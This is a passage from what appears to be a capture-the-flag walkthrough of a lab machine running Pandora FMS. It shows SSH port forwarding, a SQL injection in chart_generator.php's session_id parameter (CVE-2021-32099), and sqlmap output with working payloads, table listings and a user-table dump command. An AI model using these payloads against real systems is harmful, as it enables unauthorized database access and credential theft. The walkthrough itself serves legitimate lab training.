+</span></span></code></pre></td></tr></table></div></div><p>We can check if matt is running anything with <code>ps -ef</code> but he is not. We can also check Apache:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>daniel@pandora:/var/www/pandora/pandora_console/include$ <span class=nb>cd</span> /etc/apache2/
+</span></span><span class=line><span class=cl>daniel@pandora:/etc/apache2$ ls
+</span></span><span class=line><span class=cl>apache2.conf  conf-available  conf-enabled  envvars  magic  mods-available  mods-enabled  ports.conf  sites-available  sites-enabled
+</span></span><span class=line><span class=cl>daniel@pandora:/etc/apache2$ <span class=nb>cd</span> sites-enabled/
+</span></span><span class=line><span class=cl>daniel@pandora:/etc/apache2/sites-enabled$ ls
+</span></span><span class=line><span class=cl>000-default.conf  pandora.conf
+</span></span><span class=line><span class=cl>daniel@pandora:/etc/apache2/sites-enabled$ cat pandora.conf 
+</span></span><span class=line><span class=cl>&lt;VirtualHost localhost:80&gt;
+</span></span><span class=line><span class=cl>  ServerAdmin admin@panda.htb
+</span></span><span class=line><span class=cl>  ServerName pandora.panda.htb
+</span></span><span class=line><span class=cl>  DocumentRoot /var/www/pandora
+</span></span><span class=line><span class=cl>  AssignUserID matt matt
+</span></span><span class=line><span class=cl>  &lt;Directory /var/www/pandora&gt;
+</span></span><span class=line><span class=cl>    AllowOverride All
+</span></span><span class=line><span class=cl>  &lt;/Directory&gt;
+</span></span><span class=line><span class=cl>  ErrorLog /var/log/apache2/error.log
+</span></span><span class=line><span class=cl>  CustomLog /var/log/apache2/access.log combined
+</span></span><span class=line><span class=cl>&lt;/VirtualHost&gt;
+</span></span></code></pre></td></tr></table></div></div><p>We can add the ServerName to <code>/etc/hosts</code> like so:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>10.10.11.136  pandora.htb  pandora.panda.htb
+</span></span></code></pre></td></tr></table></div></div><p>Nop, nothing changed. We type <code>~C</code> to go into a ssh menu and start listening. We can check if we are listening:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ss -lnpt <span class=p>|</span> grep <span class=m>8000</span>
+</span></span></code></pre></td></tr></table></div></div><p>And we are not, so we run:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ssh&gt; -L 8000:127.0.0.1:80
+</span></span><span class=line><span class=cl>Forwarding port.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>~/htb/pandora &gt; ss -lnpt <span class=p>|</span> grep <span class=m>8000</span>                                                                                                                                                                                                  err 0<span class=p>|</span><span class=m>1</span>
+</span></span><span class=line><span class=cl>LISTEN <span class=m>0</span>      <span class=m>128</span>        127.0.0.1:8000      0.0.0.0:*    users:<span class=o>((</span><span class=s2>&#34;ssh&#34;</span>,pid<span class=o>=</span>161846,fd<span class=o>=</span>8<span class=o>))</span>
+</span></span><span class=line><span class=cl>LISTEN <span class=m>0</span>      <span class=m>128</span>            <span class=o>[</span>::1<span class=o>]</span>:8000         <span class=o>[</span>::<span class=o>]</span>:*    users:<span class=o>((</span><span class=s2>&#34;ssh&#34;</span>,pid<span class=o>=</span>161846,fd<span class=o>=</span>7<span class=o>)</span>
+</span></span></code></pre></td></tr></table></div></div><ul><li><code>-L</code>: local port forward.</li></ul><p>Now we can checkout: <code>http://localhost:8000</code>!</p><p><img src=https://pietraferreira.github.io/quartz//notes/images/Screenshot%20from%202022-07-18%2012-44-31.png width=auto alt></p><p>We can now <code>searchploit Pandora 7</code>. They seem all to be authenticated, so we need a login.</p><p>There is
+<a href=https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained/ rel=noopener>this</a> online, which points to
+<a href=https://github.com/ibnuuby/CVE-2021-32099 rel=noopener>CVE-2021-32099</a>.</p><p>We need to do something like:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>localhost:8000/pandora_console/include/chart_generator.php?session_id<span class=o>=</span>&lt;injection&gt;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>http://localhost:8000/pandora_console/include/chart_generator.php?session_id<span class=o>=</span>1<span class=err>&#39;</span> or <span class=nv>1</span><span class=o>=</span>1-- d
+</span></span></code></pre></td></tr></table></div></div><p>It doesn&rsquo;t show <code>Access Not Granted</code> so promising. Let&rsquo;s try <strong>Burp</strong>. We intercept it, modify it a bit and save it to file to run <code>sqlmap</code>:</p><p><img src=https://pietraferreira.github.io/quartz//notes/images/Screenshot%20from%202022-07-18%2012-52-54.png width=auto alt></p><p>We can now check if it is injectable:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
+</span><span class=lnt>  2
+</span><span class=lnt>  3
+</span><span class=lnt>  4
+</span><span class=lnt>  5
+</span><span class=lnt>  6
+</span><span class=lnt>  7
+</span><span class=lnt>  8
+</span><span class=lnt>  9
+</span><span class=lnt> 10
+</span><span class=lnt> 11
+</span><span class=lnt> 12
+</span><span class=lnt> 13
+</span><span class=lnt> 14
+</span><span class=lnt> 15
+</span><span class=lnt> 16
+</span><span class=lnt> 17
+</span><span class=lnt> 18
+</span><span class=lnt> 19
+</span><span class=lnt> 20
+</span><span class=lnt> 21
+</span><span class=lnt> 22
+</span><span class=lnt> 23
+</span><span class=lnt> 24
+</span><span class=lnt> 25
+</span><span class=lnt> 26
+</span><span class=lnt> 27
+</span><span class=lnt> 28
+</span><span class=lnt> 29
+</span><span class=lnt> 30
+</span><span class=lnt> 31
+</span><span class=lnt> 32
+</span><span class=lnt> 33
+</span><span class=lnt> 34
+</span><span class=lnt> 35
+</span><span class=lnt> 36
+</span><span class=lnt> 37
+</span><span class=lnt> 38
+</span><span class=lnt> 39
+</span><span class=lnt> 40
+</span><span class=lnt> 41
+</span><span class=lnt> 42
+</span><span class=lnt> 43
+</span><span class=lnt> 44
+</span><span class=lnt> 45
+</span><span class=lnt> 46
+</span><span class=lnt> 47
+</span><span class=lnt> 48
+</span><span class=lnt> 49
+</span><span class=lnt> 50
+</span><span class=lnt> 51
+</span><span class=lnt> 52
+</span><span class=lnt> 53
+</span><span class=lnt> 54
+</span><span class=lnt> 55
+</span><span class=lnt> 56
+</span><span class=lnt> 57
+</span><span class=lnt> 58
+</span><span class=lnt> 59
+</span><span class=lnt> 60
+</span><span class=lnt> 61
+</span><span class=lnt> 62
+</span><span class=lnt> 63
+</span><span class=lnt> 64
+</span><span class=lnt> 65
+</span><span class=lnt> 66
+</span><span class=lnt> 67
+</span><span class=lnt> 68
+</span><span class=lnt> 69
+</span><span class=lnt> 70
+</span><span class=lnt> 71
+</span><span class=lnt> 72
+</span><span class=lnt> 73
+</span><span class=lnt> 74
+</span><span class=lnt> 75
+</span><span class=lnt> 76
+</span><span class=lnt> 77
+</span><span class=lnt> 78
+</span><span class=lnt> 79
+</span><span class=lnt> 80
+</span><span class=lnt> 81
+</span><span class=lnt> 82
+</span><span class=lnt> 83
+</span><span class=lnt> 84
+</span><span class=lnt> 85
+</span><span class=lnt> 86
+</span><span class=lnt> 87
+</span><span class=lnt> 88
+</span><span class=lnt> 89
+</span><span class=lnt> 90
+</span><span class=lnt> 91
+</span><span class=lnt> 92
+</span><span class=lnt> 93
+</span><span class=lnt> 94
+</span><span class=lnt> 95
+</span><span class=lnt> 96
+</span><span class=lnt> 97
+</span><span class=lnt> 98
+</span><span class=lnt> 99
+</span><span class=lnt>100
+</span><span class=lnt>101
+</span><span class=lnt>102
+</span><span class=lnt>103
+</span><span class=lnt>104
+</span><span class=lnt>105
+</span><span class=lnt>106
+</span><span class=lnt>107
+</span><span class=lnt>108
+</span><span class=lnt>109
+</span><span class=lnt>110
+</span><span class=lnt>111
+</span><span class=lnt>112
+</span><span class=lnt>113
+</span><span class=lnt>114
+</span><span class=lnt>115
+</span><span class=lnt>116
+</span><span class=lnt>117
+</span><span class=lnt>118
+</span><span class=lnt>119
+</span><span class=lnt>120
+</span><span class=lnt>121
+</span><span class=lnt>122
+</span><span class=lnt>123
+</span><span class=lnt>124
+</span><span class=lnt>125
+</span><span class=lnt>126
+</span><span class=lnt>127
+</span><span class=lnt>128
+</span><span class=lnt>129
+</span><span class=lnt>130
+</span><span class=lnt>131
+</span><span class=lnt>132
+</span><span class=lnt>133
+</span><span class=lnt>134
+</span><span class=lnt>135
+</span><span class=lnt>136
+</span><span class=lnt>137
+</span><span class=lnt>138
+</span><span class=lnt>139
+</span><span class=lnt>140
+</span><span class=lnt>141
+</span><span class=lnt>142
+</span><span class=lnt>143
+</span><span class=lnt>144
+</span><span class=lnt>145
+</span><span class=lnt>146
+</span><span class=lnt>147
+</span><span class=lnt>148
+</span><span class=lnt>149
+</span><span class=lnt>150
+</span><span class=lnt>151
+</span><span class=lnt>152
+</span><span class=lnt>153
+</span><span class=lnt>154
+</span><span class=lnt>155
+</span><span class=lnt>156
+</span><span class=lnt>157
+</span><span class=lnt>158
+</span><span class=lnt>159
+</span><span class=lnt>160
+</span><span class=lnt>161
+</span><span class=lnt>162
+</span><span class=lnt>163
+</span><span class=lnt>164
+</span><span class=lnt>165
+</span><span class=lnt>166
+</span><span class=lnt>167
+</span><span class=lnt>168
+</span><span class=lnt>169
+</span><span class=lnt>170
+</span><span class=lnt>171
+</span><span class=lnt>172
+</span><span class=lnt>173
+</span><span class=lnt>174
+</span><span class=lnt>175
+</span><span class=lnt>176
+</span><span class=lnt>177
+</span><span class=lnt>178
+</span><span class=lnt>179
+</span><span class=lnt>180
+</span><span class=lnt>181
+</span><span class=lnt>182
+</span><span class=lnt>183
+</span><span class=lnt>184
+</span><span class=lnt>185
+</span><span class=lnt>186
+</span><span class=lnt>187
+</span><span class=lnt>188
+</span><span class=lnt>189
+</span><span class=lnt>190
+</span><span class=lnt>191
+</span><span class=lnt>192
+</span><span class=lnt>193
+</span><span class=lnt>194
+</span><span class=lnt>195
+</span><span class=lnt>196
+</span><span class=lnt>197
+</span><span class=lnt>198
+</span><span class=lnt>199
+</span><span class=lnt>200
+</span><span class=lnt>201
+</span><span class=lnt>202
+</span><span class=lnt>203
+</span><span class=lnt>204
+</span><span class=lnt>205
+</span><span class=lnt>206
+</span><span class=lnt>207
+</span><span class=lnt>208
+</span><span class=lnt>209
+</span><span class=lnt>210
+</span><span class=lnt>211
+</span><span class=lnt>212
+</span><span class=lnt>213
+</span><span class=lnt>214
+</span><span class=lnt>215
+</span><span class=lnt>216
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sqlmap -r pandora.req --batch
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>GET parameter <span class=s1>&#39;session_id&#39;</span> is vulnerable. Do you want to keep testing the others <span class=o>(</span><span class=k>if</span> any<span class=o>)</span>? <span class=o>[</span>y/N<span class=o>]</span> N
+</span></span><span class=line><span class=cl>sqlmap identified the following injection point<span class=o>(</span>s<span class=o>)</span> with a total of <span class=m>251</span> HTTP<span class=o>(</span>s<span class=o>)</span> requests:
+</span></span><span class=line><span class=cl>---
+</span></span><span class=line><span class=cl>Parameter: session_id <span class=o>(</span>GET<span class=o>)</span>
+</span></span><span class=line><span class=cl>    Type: boolean-based blind
+</span></span><span class=line><span class=cl>    Title: OR boolean-based blind - WHERE or HAVING clause <span class=o>(</span>MySQL comment<span class=o>)</span>
+</span></span><span class=line><span class=cl>    Payload: <span class=nv>session_id</span><span class=o>=</span>-6261<span class=s1>&#39; OR 8367=8367#
+</span></span></span><span class=line><span class=cl><span class=s1>
+</span></span></span><span class=line><span class=cl><span class=s1>    Type: error-based
+</span></span></span><span class=line><span class=cl><span class=s1>    Title: MySQL &gt;= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+</span></span></span><span class=line><span class=cl><span class=s1>    Payload: session_id=1&#39;</span> OR <span class=o>(</span>SELECT <span class=m>6089</span> FROM<span class=o>(</span>SELECT COUNT<span class=o>(</span>*<span class=o>)</span>,CONCAT<span class=o>(</span>0x716b627171,<span class=o>(</span>SELECT <span class=o>(</span>ELT<span class=o>(</span><span class=nv>6089</span><span class=o>=</span>6089,1<span class=o>)))</span>,0x7170706a71,FLOOR<span class=o>(</span>RAND<span class=o>(</span>0<span class=o>)</span>*2<span class=o>))</span>x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x<span class=o>)</span>a<span class=o>)</span>-- mNaD
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    Type: time-based blind
+</span></span><span class=line><span class=cl>    Title: MySQL &gt;<span class=o>=</span> 5.0.12 AND time-based blind <span class=o>(</span>query SLEEP<span class=o>)</span>
+</span></span><span class=line><span class=cl>    Payload: <span class=nv>session_id</span><span class=o>=</span>1<span class=s1>&#39; AND (SELECT 2057 FROM (SELECT(SLEEP(5)))MjXV)-- agCG
+</span></span></span><span class=line><span class=cl><span class=s1>---
+</span></span></span><span class=line><span class=cl><span class=s1>[12:54:37] [INFO] the back-end DBMS is MySQL
+</span></span></span><span class=line><span class=cl><span class=s1>web server operating system: Linux Ubuntu 20.10 or 19.10 or 20.04 (focal or eoan)
+</span></span></span><span class=line><span class=cl><span class=s1>web application technology: Apache 2.4.41, PHP
+</span></span></span><span class=line><span class=cl><span class=s1>back-end DBMS: MySQL &gt;= 5.0 (MariaDB fork)
+</span></span></span><span class=line><span class=cl><span class=s1>[12:54:38] [INFO] fetched data logged to text files under &#39;</span>/home/hanato/.local/share/sqlmap/output/localhost<span class=s1>&#39;
+</span></span></span><span class=line><span class=cl><span class=s1>
+</span></span></span><span class=line><span class=cl><span class=s1>[*] ending @ 12:54:38 /2022-07-18/
+</span></span></span><span class=line><span class=cl><span class=s1>
+</span></span></span><span class=line><span class=cl><span class=s1>---
+</span></span></span><span class=line><span class=cl><span class=s1>
+</span></span></span><span class=line><span class=cl><span class=s1>sqlmap -r pandora.req --batch -D pandora --tables
+</span></span></span><span class=line><span class=cl><span class=s1>
+</span></span></span><span class=line><span class=cl><span class=s1>+------------------------------------+
+</span></span></span><span class=line><span class=cl><span class=s1>| taddress                           |
+</span></span></span><span class=line><span class=cl><span class=s1>| taddress_agent                     |
+</span></span></span><span class=line><span class=cl><span class=s1>| tagent_access                      |
+</span></span></span><span class=line><span class=cl><span class=s1>| tagent_custom_data                 |
+</span></span></span><span class=line><span class=cl><span class=s1>| tagent_custom_fields               |
+</span></span></span><span class=line><span class=cl><span class=s1>| tagent_custom_fields_filter        |
+</span></span></span><span class=line><span class=cl><span class=s1>| tagent_module_inventory            |
+</span></span></span><span class=line><span class=cl><span class=s1>| tagent_module_log                  |
+</span></span></span><span class=line><span class=cl><span class=s1>| tagent_repository                  |
+</span></span></span><span class=line><span class=cl><span class=s1>| tagent_secondary_group             |
+</span></span></span><span class=line><span class=cl><span class=s1>| tagente                            |
+</span></span></span><span class=line><span class=cl><span class=s1>| tagente_datos                      |
+</span></span></span><span class=line><span class=cl><span class=s1>| tagente_datos_inc                  |
+</span></span></span><span class=line><span class=cl><span class=s1>| tagente_datos_inventory            |
+</span></span></span><span class=line><span class=cl><span class=s1>| tagente_datos_log4x                |
+</span></span></span><span class=line><span class=cl><span class=s1>| tagente_datos_string               |
+</span></span></span><span class=line><span class=cl><span class=s1>| tagente_estado                     |
+</span></span></span><span class=line><span class=cl><span class=s1>| tagente_modulo                     |
+</span></span></span><span class=line><span class=cl><span class=s1>| talert_actions                     |
+</span></span></span><span class=line><span class=cl><span class=s1>| talert_commands                    |
+</span></span></span><span class=line><span class=cl><span class=s1>| talert_snmp                        |
+</span></span></span><span class=line><span class=cl><span class=s1>| talert_snmp_action                 |
+</span></span></span><span class=line><span class=cl><span class=s1>| talert_special_days                |
+</span></span></span><span class=line><span class=cl><span class=s1>| talert_template_module_actions     |
+</span></span></span><span class=line><span class=cl><span class=s1>| talert_template_modules            |
+</span></span></span><span class=line><span class=cl><span class=s1>| talert_templates                   |
+</span></span></span><span class=line><span class=cl><span class=s1>| tattachment                        |
+</span></span></span><span class=line><span class=cl><span class=s1>| tautoconfig                        |
+</span></span></span><span class=line><span class=cl><span class=s1>| tautoconfig_actions                |
+</span></span></span><span class=line><span class=cl><span class=s1>| tautoconfig_rules                  |
+</span></span></span><span class=line><span class=cl><span class=s1>| tcategory                          |
+</span></span></span><span class=line><span class=cl><span class=s1>| tcluster                           |
+</span></span></span><span class=line><span class=cl><span class=s1>| tcluster_agent                     |
+</span></span></span><span class=line><span class=cl><span class=s1>| tcluster_item                      |
+</span></span></span><span class=line><span class=cl><span class=s1>| tcollection                        |
+</span></span></span><span class=line><span class=cl><span class=s1>| tconfig                            |
+</span></span></span><span class=line><span class=cl><span class=s1>| tconfig_os                         |
+</span></span></span><span class=line><span class=cl><span class=s1>| tcontainer                         |
+</span></span></span><span class=line><span class=cl><span class=s1>| tcontainer_item                    |
+</span></span></span><span class=line><span class=cl><span class=s1>| tcredential_store                  |
+</span></span></span><span class=line><span class=cl><span class=s1>| tdashboard                         |
+</span></span></span><span class=line><span class=cl><span class=s1>| tdatabase                          |
+</span></span></span><span class=line><span class=cl><span class=s1>| tdeployment_hosts                  |
+</span></span></span><span class=line><span class=cl><span class=s1>| tevent_alert                       |
+</span></span></span><span class=line><span class=cl><span class=s1>| tevent_alert_action                |
+</span></span></span><span class=line><span class=cl><span class=s1>| tevent_custom_field                |
+</span></span></span><span class=line><span class=cl><span class=s1>| tevent_extended                    |
+</span></span></span><span class=line><span class=cl><span class=s1>| tevent_filter                      |
+</span></span></span><span class=line><span class=cl><span class=s1>| tevent_response                    |
+</span></span></span><span class=line><span class=cl><span class=s1>| tevent_rule                        |
+</span></span></span><span class=line><span class=cl><span class=s1>| tevento                            |
+</span></span></span><span class=line><span class=cl><span class=s1>| textension_translate_string        |
+</span></span></span><span class=line><span class=cl><span class=s1>| tfiles_repo                        |
+</span></span></span><span class=line><span class=cl><span class=s1>| tfiles_repo_group                  |
+</span></span></span><span class=line><span class=cl><span class=s1>| tgis_data_history                  |
+</span></span></span><span class=line><span class=cl><span class=s1>| tgis_data_status                   |
+</span></span></span><span class=line><span class=cl><span class=s1>| tgis_map                           |
+</span></span></span><span class=line><span class=cl><span class=s1>| tgis_map_connection                |
+</span></span></span><span class=line><span class=cl><span class=s1>| tgis_map_has_tgis_map_con          |
+</span></span></span><span class=line><span class=cl><span class=s1>| tgis_map_layer                     |
+</span></span></span><span class=line><span class=cl><span class=s1>| tgis_map_layer_groups              |
+</span></span></span><span class=line><span class=cl><span class=s1>| tgis_map_layer_has_tagente         |
+</span></span></span><span class=line><span class=cl><span class=s1>| tgraph                             |
+</span></span></span><span class=line><span class=cl><span class=s1>| tgraph_source                      |
+</span></span></span><span class=line><span class=cl><span class=s1>| tgraph_source_template             |
+</span></span></span><span class=line><span class=cl><span class=s1>| tgraph_template                    |
+</span></span></span><span class=line><span class=cl><span class=s1>| tgroup_stat                        |
+</span></span></span><span class=line><span class=cl><span class=s1>| tgrupo                             |
+</span></span></span><span class=line><span class=cl><span class=s1>| tincidencia                        |
+</span></span></span><span class=line><span class=cl><span class=s1>| titem                              |
+</span></span></span><span class=line><span class=cl><span class=s1>| tlanguage                          |
+</span></span></span><span class=line><span class=cl><span class=s1>| tlayout                            |
+</span></span></span><span class=line><span class=cl><span class=s1>| tlayout_data                       |
+</span></span></span><span class=line><span class=cl><span class=s1>| tlayout_template                   |
+</span></span></span><span class=line><span class=cl><span class=s1>| tlayout_template_data              |
+</span></span></span><span class=line><span class=cl><span class=s1>| tlink                              |
+</span></span></span><span class=line><span class=cl><span class=s1>| tlocal_component                   |
+</span></span></span><span class=line><span class=cl><span class=s1>| tlog_graph_models                  |
+</span></span></span><span class=line><span class=cl><span class=s1>| tmap                               |
+</span></span></span><span class=line><span class=cl><span class=s1>| tmensajes                          |
+</span></span></span><span class=line><span class=cl><span class=s1>| tmetaconsole_agent                 |
+</span></span></span><span class=line><span class=cl><span class=s1>| tmetaconsole_agent_secondary_group |
+</span></span></span><span class=line><span class=cl><span class=s1>| tmetaconsole_event                 |
+</span></span></span><span class=line><span class=cl><span class=s1>| tmetaconsole_event_history         |
+</span></span></span><span class=line><span class=cl><span class=s1>| tmetaconsole_setup                 |
+</span></span></span><span class=line><span class=cl><span class=s1>| tmigration_module_queue            |
+</span></span></span><span class=line><span class=cl><span class=s1>| tmigration_queue                   |
+</span></span></span><span class=line><span class=cl><span class=s1>| tmodule                            |
+</span></span></span><span class=line><span class=cl><span class=s1>| tmodule_group                      |
+</span></span></span><span class=line><span class=cl><span class=s1>| tmodule_inventory                  |
+</span></span></span><span class=line><span class=cl><span class=s1>| tmodule_relationship               |
+</span></span></span><span class=line><span class=cl><span class=s1>| tmodule_synth                      |
+</span></span></span><span class=line><span class=cl><span class=s1>| tnetflow_filter                    |
+</span></span></span><span class=line><span class=cl><span class=s1>| tnetflow_report                    |
+</span></span></span><span class=line><span class=cl><span class=s1>| tnetflow_report_content            |
+</span></span></span><span class=line><span class=cl><span class=s1>| tnetwork_component                 |
+</span></span></span><span class=line><span class=cl><span class=s1>| tnetwork_component_group           |
+</span></span></span><span class=line><span class=cl><span class=s1>| tnetwork_map                       |
+</span></span></span><span class=line><span class=cl><span class=s1>| tnetwork_matrix                    |
+</span></span></span><span class=line><span class=cl><span class=s1>| tnetwork_profile                   |
+</span></span></span><span class=line><span class=cl><span class=s1>| tnetwork_profile_component         |
+</span></span></span><span class=line><span class=cl><span class=s1>| tnetworkmap_ent_rel_nodes          |
+</span></span></span><span class=line><span class=cl><span class=s1>| tnetworkmap_enterprise             |
+</span></span></span><span class=line><span class=cl><span class=s1>| tnetworkmap_enterprise_nodes       |
+</span></span></span><span class=line><span class=cl><span class=s1>| tnews                              |
+</span></span></span><span class=line><span class=cl><span class=s1>| tnota                              |
+</span></span></span><span class=line><span class=cl><span class=s1>| tnotification_group                |
+</span></span></span><span class=line><span class=cl><span class=s1>| tnotification_source               |
+</span></span></span><span class=line><span class=cl><span class=s1>| tnotification_source_group         |
+</span></span></span><span class=line><span class=cl><span class=s1>| tnotification_source_group_user    |
+</span></span></span><span class=line><span class=cl><span class=s1>| tnotification_source_user          |
+</span></span></span><span class=line><span class=cl><span class=s1>| tnotification_user                 |
+</span></span></span><span class=line><span class=cl><span class=s1>| torigen                            |
+</span></span></span><span class=line><span class=cl><span class=s1>| tpassword_history                  |
+</span></span></span><span class=line><span class=cl><span class=s1>| tperfil                            |
+</span></span></span><span class=line><span class=cl><span class=s1>| tphase                             |
+</span></span></span><span class=line><span class=cl><span class=s1>| tplanned_downtime                  |
+</span></span></span><span class=line><span class=cl><span class=s1>| tplanned_downtime_agents           |
+</span></span></span><span class=line><span class=cl><span class=s1>| tplanned_downtime_modules          |
+</span></span></span><span class=line><span class=cl><span class=s1>| tplugin                            |
+</span></span></span><span class=line><span class=cl><span class=s1>| tpolicies                          |
+</span></span></span><span class=line><span class=cl><span class=s1>| tpolicy_agents                     |
+</span></span></span><span class=line><span class=cl><span class=s1>| tpolicy_alerts                     |
+</span></span></span><span class=line><span class=cl><span class=s1>| tpolicy_alerts_actions             |
+</span></span></span><span class=line><span class=cl><span class=s1>| tpolicy_collections                |
+</span></span></span><span class=line><span class=cl><span class=s1>| tpolicy_groups                     |
+</span></span></span><span class=line><span class=cl><span class=s1>| tpolicy_modules                    |
+</span></span></span><span class=line><span class=cl><span class=s1>| tpolicy_modules_inventory          |
+</span></span></span><span class=line><span class=cl><span class=s1>| tpolicy_plugins                    |
+</span></span></span><span class=line><span class=cl><span class=s1>| tpolicy_queue                      |
+</span></span></span><span class=line><span class=cl><span class=s1>| tprofile_view                      |
+</span></span></span><span class=line><span class=cl><span class=s1>| tprovisioning                      |
+</span></span></span><span class=line><span class=cl><span class=s1>| tprovisioning_rules                |
+</span></span></span><span class=line><span class=cl><span class=s1>| trecon_script                      |
+</span></span></span><span class=line><span class=cl><span class=s1>| trecon_task                        |
+</span></span></span><span class=line><span class=cl><span class=s1>| trel_item                          |
+</span></span></span><span class=line><span class=cl><span class=s1>| tremote_command                    |
+</span></span></span><span class=line><span class=cl><span class=s1>| tremote_command_target             |
+</span></span></span><span class=line><span class=cl><span class=s1>| treport                            |
+</span></span></span><span class=line><span class=cl><span class=s1>| treport_content                    |
+</span></span></span><span class=line><span class=cl><span class=s1>| treport_content_item               |
+</span></span></span><span class=line><span class=cl><span class=s1>| treport_content_item_temp          |
+</span></span></span><span class=line><span class=cl><span class=s1>| treport_content_sla_com_temp       |
+</span></span></span><span class=line><span class=cl><span class=s1>| treport_content_sla_combined       |
+</span></span></span><span class=line><span class=cl><span class=s1>| treport_content_template           |
+</span></span></span><span class=line><span class=cl><span class=s1>| treport_custom_sql                 |
+</span></span></span><span class=line><span class=cl><span class=s1>| treport_template                   |
+</span></span></span><span class=line><span class=cl><span class=s1>| treset_pass                        |
+</span></span></span><span class=line><span class=cl><span class=s1>| treset_pass_history                |
+</span></span></span><span class=line><span class=cl><span class=s1>| tserver                            |
+</span></span></span><span class=line><span class=cl><span class=s1>| tserver_export                     |
+</span></span></span><span class=line><span class=cl><span class=s1>| tserver_export_data                |
+</span></span></span><span class=line><span class=cl><span class=s1>| tservice                           |
+</span></span></span><span class=line><span class=cl><span class=s1>| tservice_element                   |
+</span></span></span><span class=line><span class=cl><span class=s1>| tsesion                            |
+</span></span></span><span class=line><span class=cl><span class=s1>| tsesion_extended                   |
+</span></span></span><span class=line><span class=cl><span class=s1>| tsessions_php                      |
+</span></span></span><span class=line><span class=cl><span class=s1>| tskin                              |
+</span></span></span><span class=line><span class=cl><span class=s1>| tsnmp_filter                       |
+</span></span></span><span class=line><span class=cl><span class=s1>| ttag                               |
+</span></span></span><span class=line><span class=cl><span class=s1>| ttag_module                        |
+</span></span></span><span class=line><span class=cl><span class=s1>| ttag_policy_module                 |
+</span></span></span><span class=line><span class=cl><span class=s1>| ttipo_modulo                       |
+</span></span></span><span class=line><span class=cl><span class=s1>| ttransaction                       |
+</span></span></span><span class=line><span class=cl><span class=s1>| ttrap                              |
+</span></span></span><span class=line><span class=cl><span class=s1>| ttrap_custom_values                |
+</span></span></span><span class=line><span class=cl><span class=s1>| tupdate                            |
+</span></span></span><span class=line><span class=cl><span class=s1>| tupdate_journal                    |
+</span></span></span><span class=line><span class=cl><span class=s1>| tupdate_package                    |
+</span></span></span><span class=line><span class=cl><span class=s1>| tupdate_settings                   |
+</span></span></span><span class=line><span class=cl><span class=s1>| tuser_double_auth                  |
+</span></span></span><span class=line><span class=cl><span class=s1>| tuser_task                         |
+</span></span></span><span class=line><span class=cl><span class=s1>| tuser_task_scheduled               |
+</span></span></span><span class=line><span class=cl><span class=s1>| tusuario                           |
+</span></span></span><span class=line><span class=cl><span class=s1>| tusuario_perfil                    |
+</span></span></span><span class=line><span class=cl><span class=s1>| tvisual_console_elements_cache     |
+</span></span></span><span class=line><span class=cl><span class=s1>| twidget                            |
+</span></span></span><span class=line><span class=cl><span class=s1>| twidget_dashboard                  |
+</span></span></span><span class=line><span class=cl><span class=s1>+------------------------------------+
+</span></span></span><span class=line><span class=cl><span class=s1>
+</span></span></span><span class=line><span class=cl><span class=s1>[12:57:46] [INFO] fetched data logged to text files under &#39;</span>/home/hanato/.local/share/sqlmap/output/localhost<span class=err>&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>---
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>sqlmap -r pandora.req --batch -D pandora -T usuario --dump
+</span></span></code></pre></td></tr></table></div></div><p>Let&rsquo;s also try:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>time</span> sqlmap -r pandora.req --dump -D pandora --batch --thread <span class=m>10</span>
+</span></span></code></pre></td></tr></table></div></div><p>And see how long it take. We can look at the output using <code>less</code> by running:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>less ~/.local/share/sqlmap/output/localhost/dump/pandora/tusuario.csv -S
